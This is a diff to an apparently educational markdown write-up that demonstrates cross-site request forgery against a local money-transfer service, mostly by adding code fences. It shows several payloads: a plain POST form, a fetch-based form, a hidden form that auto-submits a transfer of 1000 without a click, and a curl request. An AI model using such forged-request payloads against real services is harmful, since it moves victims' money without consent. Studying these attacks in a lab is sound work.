@@ -1,13 +1,14 @@
 ### First Method with an simple interface
-
+```
 <form action="http://localhost:8080" method="POST">
 
 <input type="number" name="amount" value="100"/>
 <input type="submit" value="Transfer Money"/>
-
+```
 ### Second Method with an interface more developped ! and the content-type but not really needed because in that case we have, 1. Error: NetworkError when attempting to fetch resource. and 2. Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at http://localhost:8080/transfer. (Reason: CORS header ‘Access-Control-Allow-Origin’ missing). Status code: 200.
 
-<!-- <!DOCTYPE html>
+```
+<!DOCTYPE html>
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
@@ -48,19 +49,22 @@ document.getElementById('csrfForm').addEventListener('submit', async function(e)
 });
 </script>
 </body>
-</html> -->
+</html>
+```
 
 ### Third method it transfer the amount without clicking on the submit button
-
+```
 <form action="http://localhost:8080/transfer" method="POST">
   <input type="hidden" name="amount" value="1000"/>
 </form>
 <script>
   document.forms[0].submit();
 </script>
+```
 
 ### Bonus method you only have to send this request with curl and bingo.
-
+```
 curl -X POST http://localhost:8080/transfer -d "amount=1000"
 
 return value {"success":true}. So we can see the POST request has been accepted.
+```
